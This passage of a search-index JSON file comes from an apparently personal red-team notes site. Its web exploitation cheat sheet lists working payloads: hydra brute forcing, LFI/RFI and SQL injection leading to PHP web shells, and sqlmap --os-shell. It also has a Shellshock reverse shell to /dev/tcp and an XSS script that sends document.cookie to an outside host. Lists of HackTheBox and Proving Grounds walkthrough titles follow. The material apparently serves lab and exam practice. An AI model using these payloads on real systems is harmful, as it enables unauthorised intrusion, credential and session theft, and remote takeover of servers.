/home/kali/tools/directory/rockyou.txt Broute force hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192 .168.169.106 --http-post-form '/login:user=^USER^,pass=^PASS^:Unauthorized'","title":"Credentials"},{"location":"red-teaming/web-application/exploitation/#directory-traversal","text":"Unix /etc/passwd Windows c:\\windows\\system32\\drivers\\etc\\hosts","title":"Directory Traversal"},{"location":"red-teaming/web-application/exploitation/#php-wrappers","text":"Inject php code via plantext http://ip/file.php?file = data:text/plain,<?php echo shell_exec ( \"dir\" ) ?> Inject php code via base64 http://ip/file.php?file = data: ; base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4 = & x = dir Encode base64 file before read it. http://ip/file.php?file = php://filter/read = convert.base64-encode/resource = /etc/passwd","title":"PHP Wrappers"},{"location":"red-teaming/web-application/exploitation/#file-inclusion","text":"","title":"File Inclusion"},{"location":"red-teaming/web-application/exploitation/#local-file-inclusion","text":"Null byte: %00 Write payload to access.log file $ nc -nv 192 .168.11.131 80 ( UNKNOWN ) [ 192 .168.11.131 ] 80 ( http ) open <?php echo '<pre>' . shell_exec ( $_GET [ 'cmd' ]) . '</pre>' ; ?> Get RCE via file inclusion curl http://192.168.11.131/file.php?file = c: \\x ampp \\a pache \\l ogs \\a ccess.log & cmd = ipconfig","title":"Local File Inclusion"},{"location":"red-teaming/web-application/exploitation/#remote-file-inclusion","text":"<?php echo shell_exec ( $_GET [ 'cmd' ]); ?> curl http://target/?page = http:// $ip /backdoor.txt & cmd = id","title":"Remote File Inclusion"},{"location":"red-teaming/web-application/exploitation/#sql-injection","text":"","title":"SQL Injection"},{"location":"red-teaming/web-application/exploitation/#authentication-bypass","text":"admin ' or 1 = 1 LIMIT 1 ; #","title":"Authentication Bypass"},{"location":"red-teaming/web-application/exploitation/#enumerating-the-database","text":"order by 3 union all select 1 , 2 , 3 union all select 1 , @@version, 3 union all select 1 , table_name from information_schema.tables, 3 union all select 1 , column_name from information_schema.columns where table_name = 'users' , 3 union all select 1 , username, password from users","title":"Enumerating the Database"},{"location":"red-teaming/web-application/exploitation/#sqli-to-code-execution","text":"Read file union all select 1 , load_file ( 'C:/Windows/System32/drivers/etc/hosts' ) , 3 Write backdoor union all select 1 , \"<?php echo shell_exec( $_GET ['cmd']);?>\" into OUTFILE 'c:/xampp/htdocs/backdoor.php' , 3 priority = Normal ' UNION SELECT (' <?php echo exec ( $_GET [ \"c\" ]) ; ') INTO OUTFILE ' /srv/http/c.php ' ; -- -","title":"SQLi to Code Execution"},{"location":"red-teaming/web-application/exploitation/#automating-sql-injection","text":"sqlmap B: Boolean-based blind E: Error-based U: Union query-based S: Stacked queries T: Time-based blind Q: Inline queries sqlmap -u http:// $ip /debug.php?id = 1 -p \"id\" dump databases sqlmap -u http:// $ip /debug.php?id = 1 -p \"id\" --dbms = mysql --dump execute a shell sqlmap -u http:// $ip /debug.php?id = 1 -p \"id\" --dbms = mysql --os-shell file post sqlmap -r req --dbms mysql -p limit --level 3 --batch --technique = S --os-shell","title":"Automating SQL Injection"},{"location":"red-teaming/web-application/exploitation/#shellshock-poc","text":"curl -H \"user-agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/ $myip /445 0>&1'\" http:// $ip /cgi-bin/user.sh","title":"Shellshock POC"},{"location":"red-teaming/web-application/exploitation/#command-execution","text":"; id ` id ` $( id )","title":"Command Execution"},{"location":"red-teaming/web-application/exploitation/#code-execution","text":"Ruby eval \"\\\"\" +params [ '1' ] + \"\\\"\" ?1 = \"%2b`id`%2b\" Python eval ( '\"' +1+ '\"' ) \"%2bos.system('id')%2b\" \"%2bos.popen('id').read()%2b\" \"%2b__import__('os').popen('id').read()%2b\" \"%2b__import__('os').popen(__import__('base64').b64decode('aWQ=')).read()%2b\" Perl eval ( \"return '\" . $FORM { 1 } . \"'\" ) ; /cgi-bin/form?1 = '.`id`.' PHP eval() $s = \"echo \\\"\" . $_GET [ '1' ] . \"\\\";\" ; eval ( $s ) ; ?1 = \".system('id').\" usort() $1 = $_GET [ \"1\" ] ; usort ( function ( '$a, $b' , 'return strcmp($a->' . $1 . ',$b->' . $1 . ');' )) ; ?1 = id ) ; } system ( 'id' ) ; // preg_replace() preg_replace ( $_GET [ \"1\" ] , $_GET [ \"2\" ] , $_GET [ \"3\" ]) ; ?1 = /x/e & 2 = system ( 'id' ) & 3 = x assert() assert ( trim ( \"'\" . $_GET [ '1' ] . \"'\" )) ; echo htmlentities ( $_GET [ '1' ]) ; ?1 = hacker '.system(' id ').'","title":"Code Execution"},{"location":"red-teaming/web-application/exploitation/#sitemaster-to-rce","text":"<%@ Language=\"C#\" src=\"site.master.cs\" Inherits=\"MyNamespaceMaster.MyClassMaster\" %> <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"en\"> <head runat=\"server\"> <title>Butch</title> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> <meta name=\"application-name\" content=\"Butch\"> <meta name=\"author\" content=\"Butch\"> <meta name=\"description\" content=\"Butch\"> <meta name=\"keywords\" content=\"Butch\"> <link media=\"all\" href=\"style.css\" rel=\"stylesheet\" type=\"text/css\" /> <link id=\"favicon\" rel=\"shortcut icon\" type=\"image/png\" href=\"favicon.png\" /> </head> <body> <div id=\"wrap\"> <div id=\"header\">Welcome to Butch Repository</div> <div id=\"main\"> <div id=\"content\"> <br /> <asp:contentplaceholder id=\"ContentPlaceHolder1\" runat=\"server\"></asp:contentplaceholder> <br /> </div> </div> </div> </body> </html> <% string stdout = \"\"; string cmd = \"whoami\"; System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo(\"cmd\", \"/c \" + cmd); procStartInfo.RedirectStandardOutput = true; procStartInfo.UseShellExecute = false; procStartInfo.CreateNoWindow = true; System.Diagnostics.Process p = new System.Diagnostics.Process(); p.StartInfo = procStartInfo; p.Start(); stdout = p.StandardOutput.ReadToEnd(); Response.Write(stdout); %> </body> </html> nt authority\\system","title":"site.master to RCE"},{"location":"red-teaming/web-application/exploitation/#xss-basic-exploit","text":"Break code < > ' \" { } ; Content Injection <iframe src=http://ip/report height=\"0\" width=\"0\"></iframe> Stealing Cookies and Session Information <script>new Image().src=\"http://10.11.0.4/cool.jpg?output=\"+document.cookie;</script>","title":"XSS Basic Exploit"},{"location":"red-teaming/wireless-rfid/","text":"","title":"Index"},{"location":"walkthrough/hackthebox/","text":"hackthebox walkthrough 001-lame_vsftpd-2.3.4-samba-3.0.20-distcc-daemon_suid-nmap 002-legacy_smb_ms08-067-ms17-010 003-devel_aspx-backdoor_ms11-046-6.1.7600 004-popcorn_torrent-hoster_pam-1.1.0-kernel-2.6.37 005-beep_elastix-2.2.0-webmin-shellshock_suid-nmap 006-optimum_httpfileserver-2.3_ms16-098-6.3.9600 007-bastard_drupa7.54_MS15-051-6.3.9600 011-cronos_SQL-Injection_overwrite-crontab 021-haircut-command_inj-screen_4.5.0 051-blue_EternalBlue-MS17-010 054-nineveh_LFIbypassFiltering_Chkrootkit-Knockd 108-shocker_Shellshock_sudo-perl 118-bashed_phpbash-discovery_sudo-scriptmanager 121-nibbles_Nibbleblog-4.0.3_sudo-monitor 134-canape_cPickle-Deserialize_Erlang-couchdb_sudo-pip 142-bounty_web.config-asp-backdoor_JuicyPotato 144-jerry_tomcat-deploy-war 186-bastion_mount-vhd-SAM_mRemoteNG-creds 240-servmon_NVMS-1000_NSClient-0.5.2.35 259-tabby_tomcat-script-deploy_lxd-lxc-mount","title":"HackTheBox"},{"location":"walkthrough/hackthebox/#hackthebox-walkthrough","text":"001-lame_vsftpd-2.3.4-samba-3.0.20-distcc-daemon_suid-nmap 002-legacy_smb_ms08-067-ms17-010 003-devel_aspx-backdoor_ms11-046-6.1.7600 004-popcorn_torrent-hoster_pam-1.1.0-kernel-2.6.37 005-beep_elastix-2.2.0-webmin-shellshock_suid-nmap 006-optimum_httpfileserver-2.3_ms16-098-6.3.9600 007-bastard_drupa7.54_MS15-051-6.3.9600 011-cronos_SQL-Injection_overwrite-crontab 021-haircut-command_inj-screen_4.5.0 051-blue_EternalBlue-MS17-010 054-nineveh_LFIbypassFiltering_Chkrootkit-Knockd 108-shocker_Shellshock_sudo-perl 118-bashed_phpbash-discovery_sudo-scriptmanager 121-nibbles_Nibbleblog-4.0.3_sudo-monitor 134-canape_cPickle-Deserialize_Erlang-couchdb_sudo-pip 142-bounty_web.config-asp-backdoor_JuicyPotato 144-jerry_tomcat-deploy-war 186-bastion_mount-vhd-SAM_mRemoteNG-creds 240-servmon_NVMS-1000_NSClient-0.5.2.35 259-tabby_tomcat-script-deploy_lxd-lxc-mount","title":"hackthebox walkthrough"},{"location":"walkthrough/pg/","text":"pg walkthrough - private Warm-up 1. Internal 2. Helpdesk 3. Bratarina 4. Kevin 5. Pebbles 6. Twiggy 7. Metallus 8. Hawat 9. Interface 10. Wombo 11. Algernon 12. ClamAV Get-to-work 1. Butch 2. Reconstruction 3. Shenzi 4. ZenPhoto 5. Nappa 6. Sorcerer 7. Snookums 8. Fail 9. AuthBy 10. Catto 11. Hutch 12. Zino 13. Walla 14. Banzai 15. Roquefort 16. Malbec 17. Postfish 18. Sybaris 19. Hunit 20. G00g 21. UC404 22. Splodge 23. PayDay 24. UT99 25. Medjed 26. Hetemit 27. Nibbles 28. Dibble 29. Jacko 30. Cassios 31. Nukem 32. Flasky 33. Apex 34. XposedAPI 35. Billyboss 36. Hepet 37. Quackerjack 38. WebCal 39. Pelican 40. Panic Try-harder 1. CookieCutter 2. Clyde 3. Peppo 4. BadCorp 5. Shifty 6. Vector 7. Synapse 8. Escape 9. Megavolt 10. Develop 11. Phobos 12. Meathead 13. Sirol 14. Tico","title":"Proving Grounds"},{"location":"walkthrough/pg/#pg-walkthrough-private","text":"Warm-up 1. Internal 2. Helpdesk 3. Bratarina 4. Kevin 5. Pebbles 6. Twiggy 7. Metallus 8. Hawat 9. Interface 10. Wombo 11. Algernon 12. ClamAV Get-to-work 1. Butch 2. Reconstruction 3. Shenzi 4. ZenPhoto 5. Nappa 6. Sorcerer 7. Snookums 8. Fail 9. AuthBy 10. Catto 11. Hutch 12. Zino 13. Walla 14. Banzai 15. Roquefort 16. Malbec 17. Postfish 18. Sybaris 19. Hunit 20. G00g 21. UC404 22. Splodge 23. PayDay 24. UT99 25. Medjed 26. Hetemit 27. Nibbles 28. Dibble 29. Jacko 30. Cassios 31. Nukem 32. Flasky 33. Apex 34. XposedAPI 35. Billyboss 36. Hepet 37. Quackerjack 38. WebCal 39. Pelican 40. Panic Try-harder 1. CookieCutter 2. Clyde 3. Peppo 4. BadCorp 5. Shifty 6. Vector 7. Synapse 8. Escape 9. Megavolt 10. Develop 11. Phobos 12. Meathead 13. Sirol 14. Tico","title":"pg walkthrough - private"},{"location":"walkthrough/tryhackme/","text":"tryhackme walkthrough under construction","title":"tryhackme walkthrough"},{"location":"walkthrough/tryhackme/#tryhackme-walkthrough","text":"under construction","title":"tryhackme walkthrough"},{"location":"walkthrough/vulnhub/","text":"vulnhub walkthrough under construction","title":"vulnhub walkthrough"},{"location":"walkthrough/vulnhub/#vulnhub-walkthrough","text":"under construction","title":"vulnhub walkthrough"}]}